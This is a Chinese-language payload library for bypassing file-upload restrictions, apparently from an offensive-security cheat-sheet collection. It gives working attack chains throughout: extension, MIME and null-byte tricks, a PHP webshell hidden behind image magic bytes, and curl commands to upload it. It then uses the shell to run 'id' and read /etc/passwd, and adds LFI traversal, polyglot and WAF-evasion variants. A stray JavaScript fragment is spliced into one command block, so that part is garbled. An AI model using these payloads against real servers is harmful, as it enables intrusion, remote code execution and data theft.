# 上传绕过 payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:文件上传通用绕过(扩展名 / Content-Type / 文件头) + MIME 类型绕过 + 空字节截断。普通上传点 80% 的情况覆盖在这里。

---

## A. 文件上传绕过

### 文件上传绕过  `file-upload-bypass`
文件上传限制绕过技术
子类：**文件上传** · tags: `upload` `bypass` `webshell`

**前置条件：** 目标存在文件上传功能；存在上传限制

**攻击链：**

**1. 扩展名绕过**
_扩展名绕过(含大小写、双后缀)_
```
shell.php.jpg
shell.php%00.jpg
shell.phtml
shell.php5
shell.phar
shell.PhP
```

**2. Content-Type**
_修改Content-Type_
```
Content-Type: image/jpeg
Content-Type: image/png
```

**3. 图片马**  _[windows]_
_图片马制作_
```
copy normal.jpg/b + shell.php/a webshell.jpg
```

**4. 空格绕过**  _[windows]_
_文件名末尾空格_
```
# 空格/空字符绕过后缀检测:
# 1. 文件名末尾加空格(Windows特性，保存时自动去除):
filename="shell.php "

# 2. %20编码空格:
Content-Disposition: form-data; name="file"; filename="shell.php%20"

# 3. 空字节截断(PHP<5.3.4):
filename="shell.php%00.jpg"
filename="shell.php.jpg"

# 4. 制表符注入:
filename="shell.php%09.jpg"

# Burp中操作: 拦截上传请求 → 在filename中的.php后手动添加空格/空字节
```

**5. 点号绕过**  _[windows]_
_文件名末尾点号_
```
# 点号/特殊字符绕过:
# 1. 末尾加点(Windows会自动去除末尾的点):
filename="shell.php."
filename="shell.php..."

# 2. 点+空格组合:
filename="shell.php. "
filename="shell.php .jpg"

# 3. 分号截断(IIS 6.0):
filename="shell.asp;.jpg"
filename="test.asp;x.jpg"

# 4. ::概念(不执行，仅说明)
# Windows NTFS流: shell.php::DATA_STREAM

# 5. 换行符注入:
filename="shell.ph
p"

# 测试: 上传后访问URL，确认文件是否被当作PHP解析
curl "http://target.com/uploads/shell.php." -v
```

**6. NTFS流**  _[windows]_
_NTFS ADS绕过_
```
# Windows NTFS备用数据流绕过:
# 1. 标准NTFS ADS绕过:
filename="shell.php::DATA"
# Windows会自动忽略::DATA后缀，文件保存为shell.php

# 2. 其他ADS变体:
filename="shell.php::INDEX_ALLOCATION"
filename="shell.php:evil.php"
filename="shell.php:evil.txt:DATA"

# 3. 在Burp中操作:
# 拦截上传请求
# 修改filename为: shell.php::DATA
# 发送请求

# 4. 验证文件是否上传:
curl "http://target.com/uploads/shell.php" -v
curl "http://target.com/uploads/shell.php::DATA" -v

# 注意: 仅在Windows(IIS/NTFS)环境有效，Linux无此特性
```

**7. 双写绕过**
_双写扩展名_
```
# 双写后缀绕过(当服务器仅删除一次敏感后缀时):
# 1. PHP双写:
filename="shell.pphphp"    # 删除php后剩余shell.php
filename="shell.pHPhp"     # 大小写混合双写
filename="shell.phphpp"    # 不同位置双写

# 2. ASP双写:
filename="shell.asaspp"    # 删除asp后剩余shell.asp
filename="shell.aaspsp"

# 3. JSP双写:
filename="shell.jjspsp"

# 4. 多层嵌套:
filename="shell.phpphpphp" # 两次删除后仍为.php

# 5. 结合大小写:
filename="shell.PhPhPp"

# 验证: 上传后确认服务器保存的实际文件名
curl -I "http://target.com/uploads/shell.php"
```

**WAF/EDR 绕过变体：**

**1. 双扩展名与NTFS数据流绕过**
_利用双扩展名欺骗文件类型检测，Windows NTFS备用数据流(::$DATA)绕过扩展名检查，特殊字符(空格、点号、空字节)截断文件名_
```
# 双扩展名:
shell.php.jpg
shell.jpg.php
shell.php.test
shell.php%00.jpg

# NTFS备用数据流(Windows):
shell.php::$DATA
shell.php::$DATA.jpg
shell.asp;.jpg

# 特殊字符:
shell.php%20
shell.php.
shell.php....
shell.php.jpg
```

**2. Content-Disposition操纵与分块上传**
_通过Content-Disposition头的filename编码变体、分块传输编码(Chunked)绕过WAF流检测，利用PHP包装器协议访问压缩包内的恶意文件_
```
# Content-Disposition字段名包裹绕过:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Disposition: form-data; name="file"; filename*=UTF-8''shell.php
Content-Disposition: form-data; name="file"; filename="shell.php"

# 分块传输编码:
Transfer-Encoding: chunked

# PHP Wrapper上传:
zip://uploads/avatar.jpg%23shell
phar://uploads/avatar.jpg/shell.php

# 竞态条件:
# 上传后立即在文件被删除前访问
```

---


---

## B. MIME 类型绕过

### MIME类型绕过  `file-mime`
通过伪造MIME类型(Content-Type)绕过文件上传的类型检查，上传恶意可执行文件
子类：**MIME** · tags: `mime` `bypass`

**前置条件：** 目标存在文件上传功能；服务端仅通过Content-Type判断文件类型；了解目标允许的MIME类型

**攻击链：**

**1. 探测文件类型检查机制**  _[linux]_
_通过对比测试判断服务端使用的文件类型验证方式_
```
# 测试不同的上传方式判断检查点:

# 1. 正常上传(应该成功):
curl -F "file=@test.jpg;type=image/jpeg" "http://target.com/upload"

# 2. 修改Content-Type(判断是否仅检查MIME):
curl -F "file=@shell.php;type=image/jpeg" "http://target.com/upload"

# 3. 修改扩展名(判断是否检查扩展名):
curl -F "file=@shell.jpg;type=application/x-php" "http://target.com/upload"

# 4. 仅修改文件头(判断是否检查Magic Bytes):
# GIF89a开头的PHP:
printf "GIF89a<?php system($_GET['cmd']); ?>" > shell.gif
curl -F "file=@shell.gif;type=image/gif" "http://target.com/upload"
```

**2. MIME类型伪造上传Webshell**  _[linux]_
_使用MIME伪造结合各种文件名技巧上传可执行文件_
```
# 将PHP webshell的Content-Type伪造为图片:
curl -X POST "http://target.com/upload"   -F "file=@shell.php;type=image/jpeg;filename=shell.php"

# 如果服务端同时检查扩展名，使用双扩展名:
curl -F "file=@shell.php;type=image/jpeg;filename=shell.php.jpg" "http://target.com/upload"
curl -F "file=@shell.php;type=image/png;filename=shell.jpg.php" "http://target.com/upload"

# Apache多扩展名解析:
curl -F "file=@shell.php;type=image/jpeg;filename=shell.php.abc" "http://target.com/upload"

# Nginx解析漏洞:
curl -F "file=@shell.jpg;type=image/jpeg" "http://target.com/upload"
curl "http://target.com/uploads/shell.jpg/.php"
```

**3. Magic Bytes伪造**  _[linux]_
_在恶意文件前面添加合法的Magic Bytes文件头绕过内容检查_
```
# 在PHP文件前添加各种文件头:

# JPEG文件头:
printf "ÿØÿàJFIF" > shell.php
echo "<?php system($_GET['cmd']); ?>" >> shell.php

# PNG文件头:
printf "PNG

" > shell.php
echo "<?php system($_GET['cmd']); ?>" >> shell.php

# GIF文件头:
printf "GIF89a" > shell.php
echo "<?php system($_GET['cmd']); ?>" >> shell.php

# BMP文件头:
printf "BM" > shell.php
echo "<?php system($_GET['cmd']); ?>" >> shell.php

# 上传:
curl -F "file=@shell.php;type=image/jpeg;filename=shell.php" "http://target.com/upload"
```

**4. 验证上传结果**
_确认上传文件路径并验证Webshell可执行_
```
# 确认文件上传路径:
curl -v "http://target.com/uploads/shell.php"

# 执行命令:
curl "http://target.com/uploads/shell.php?cmd=id"
curl "http://target.com/uploads/shell.php?cmd=cat+/etc/passwd"

# 如果无法直接访问，尝试其他路径:
curl "http://target.com/upload/files/shell.php?cmd=id"
curl "http://target.com/static/uploads/shell.php?cmd=id"
curl "http://target.com/resources/shell.php?cmd=id"
```

**WAF/EDR 绕过变体：**

**1. Polyglot文件绕过**
_创建同时满足图片格式魔术字节和PHP解析的Polyglot文件，绕过文件类型检测_
```
# GIF+PHP Polyglot
GIF89a<?php echo "security_check"; ?>

# PNG+PHP Polyglot（使用exiftool注入）
exiftool -Comment='<?php echo "security_check"; ?>' test.png
mv test.png test.php.png

# JPEG Polyglot
exiftool -DocumentName='<?php echo "security_check"; ?>' test.jpg

# BMP+PHP
python3 -c "import struct; open('poly.php.bmp','wb').write(b'BM'+struct.pack('<I',54)+b'\x00'*46+b'<?php echo \"security_check\"; ?>')"
```

**2. Content-Type边界操控**
_利用多重Content-Type头、boundary混淆和MIME大小写差异绕过WAF文件类型检查_
```
# 多个Content-Type头
POST /upload HTTP/1.1
Content-Type: image/jpeg
Content-Type: application/x-php

# boundary混淆
Content-Type: multipart/form-data; boundary=abc; boundary=xyz

# 大小写混淆MIME类型
Content-Type: Image/JPEG
Content-Type: image/JPEG; charset=utf-8

# 添加额外参数
Content-Type: image/jpeg; name="test.php"
```

**3. EXIF元数据注入payload**
_将payload注入图片的EXIF/XMP/ICC元数据字段，配合文件包含漏洞执行代码_
```
# EXIF Comment注入
exiftool -Comment='<?php system("id"); ?>' photo.jpg

# XMP元数据注入
exiftool -XMP-dc:Description='<script>alert(1)</script>' photo.jpg

# ICC Profile注入
exiftool -ICC_Profile:ProfileDescription='<?php echo "security_check"; ?>' photo.jpg

# 上传后配合文件包含利用
# http://target/include.php?file=uploads/photo.jpg
```

---


---

## C. 空字节截断

### 空字节截断  `file-null-byte`
利用空字节(%00/\x00)截断文件名的扩展名验证，绕过文件上传白名单限制
子类：**Null Byte** · tags: `null-byte` `bypass`

**前置条件：** 目标使用白名单验证文件扩展名；后端语言或库受空字节截断影响(PHP<5.3.4, Java旧版本)；服务端在路径拼接中存在截断点

**攻击链：**

**1. 空字节截断原理与环境检测**
_检测目标环境是否可能受空字节截断影响_
```
# 空字节截断受影响的环境:
# - PHP < 5.3.4 (底层C函数将视为字符串结尾),
        syntaxBreakdown: [
          { part: '<script>', explanation: { zh: '脚本标签', en: 'Scripttag' }, type: 'tag' },
          { part: 'alert()', explanation: { zh: '弹窗函数', en: 'Alert function' }, type: 'function' }
        ]
# - Java旧版本的File类
# - 部分Python 2.x版本
# - 使用C/C++扩展的程序

# 检测PHP版本:
curl -sI "http://target.com/" | grep -i "x-powered-by|server"
curl -s "http://target.com/phpinfo.php" | grep -i "php version"
```

**2. 文件上传空字节截断**
_在文件名中注入空字节截断扩展名验证_
```
# 方法1: URL编码空字节:
curl -F "file=@shell.php;filename=shell.php%00.jpg" "http://target.com/upload"

# 方法2: 在Burp中修改原始字节:
# 将文件名 shell.php[0x00].jpg 中的[0x00]替换为实际的空字节
# Burp Repeater → 选中%00 → 右键 → Convert → URL decode

# 方法3: Python发送:
import requests
files = {"file": ("shell.php.jpg", open("shell.php","rb"), "image/jpeg")}
r = requests.post("http://target.com/upload", files=files)
print(r.status_code, r.text[:200])
```

**3. 文件包含空字节截断**  _[linux]_
_在文件包含场景中利用空字节截断服务端拼接的后缀_
```
# PHP文件包含中的空字节截断:
# 服务端代码: include($_GET["page"] . ".php");

# 正常请求:
curl "http://target.com/index.php?page=about"   # → include("about.php")

# 空字节截断:
curl "http://target.com/index.php?page=../../../etc/passwd%00"
# → include("../../../etc/passwd.php")
# → 实际读取 ../../../etc/passwd (截断了.php)

# 配合路径遍历:
curl "http://target.com/index.php?page=../../../var/log/apache2/access.log%00"
curl "http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config%00"
```

**4. 现代替代方案(PHP>=5.3.4)**
_在PHP 5.3.4+无法使用空字节截断时的替代绕过方案_
```
# PHP 5.3.4+已修复空字节截断，替代方案:

# 1. 路径截断(超长路径):
# Windows MAX_PATH=260, Linux PATH_MAX=4096
payload="shell.php" + "/./" * 2048 + ".jpg"
curl "http://target.com/upload" -F "file=@shell.php;filename=$payload"

# 2. 点号截断(Windows):
# Windows忽略文件名末尾的点号和空格
curl -F "file=@shell.php;filename=shell.php." "http://target.com/upload"
curl -F "file=@shell.php;filename=shell.php " "http://target.com/upload"
curl -F "file=@shell.php;filename=shell.php::$DATA" "http://target.com/upload"

# 3. 大小写绕过:
curl -F "file=@shell.pHP;type=image/jpeg" "http://target.com/upload"
```

**WAF/EDR 绕过变体：**

**1. 路径长度截断**
_利用文件系统路径最大长度限制，超长路径导致后缀被截断_
```
# PHP路径长度截断（PHP < 5.3, 超过4096字符）
../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.

# 超长扩展名截断
test.php.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

# 点号截断（Windows MAX_PATH=260）
test.php...........................................................................
```

**2. Windows特殊文件名技巧**
_利用Windows NTFS文件系统特性（ADS流/短文件名/特殊字符处理）绕过扩展名检测_
```
# 点空格点截断（Windows NTFS）
test.php. . . .
test.php::$DATA
test.php::$DATA.jpg

# ADS流隐藏扩展名
test.php::$INDEX_ALLOCATION
test.asp;.jpg
test.asp%00.jpg

# Windows短文件名（8.3格式）
TESTPH~1.PHP
SHELL~1.PHP
```

**3. 替代空字节表示**
_使用不同编码方式表示空字节或终止符，绕过WAF对%00的检测规则_
```
# 不同编码的空字节
test.php%00.jpg
test.php\x00.jpg
test.php\0.jpg
test.php\u0000.jpg

# URL编码变体
test.php%2500.jpg   # 双重编码空字节
test.php%u0000.jpg  # UTF-16空字节

# 特殊终止符
test.php%0d.jpg     # 回车符
test.php%0a.jpg     # 换行符
test.php%1a.jpg     # EOF标记
```

---

---

← 回 [00-index.md](00-index.md) · 落地为 webshell 见 [`../rce/13-file-rce-chain.md`](../rce/13-file-rce-chain.md)
